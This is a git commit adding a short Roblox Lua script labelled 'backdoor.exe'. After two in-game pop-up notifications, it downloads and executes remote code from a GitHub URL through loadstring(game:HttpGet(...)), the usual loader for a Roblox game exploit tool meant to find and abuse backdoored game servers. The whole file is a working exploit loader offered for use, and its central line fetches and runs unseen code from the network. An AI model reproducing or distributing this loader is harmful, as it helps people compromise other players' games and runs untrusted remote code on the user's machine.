ee4f6a5aa403d22bcee3fc0404fd59fd3d3a07b8
xtended <83477843+drillygzzly@users.noreply.github.com>
2022-10-01 11:01:55 -0700

    Add files via upload

---
+++ Scripts/Backdoor.exe Main.lua
@@ -0,0 +1,28 @@
+game.StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "backdoor.exe",
+			Duration = 3,
+			Text = "Loading v8"
+		}
+	)
+game.StarterGui:SetCore(
+		"SendNotification",
+		{
+			Title = "backdoor.exe",
+			Duration = 3,
+			Text = "Check Discord for newest script"
+		}
+	)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+
+
+
+--	k4scripts
+--	.------.
+--	|4.--. |
+--	| :│/: |
+--	| :│\: |
+--	| '--'4|
+--	`------'
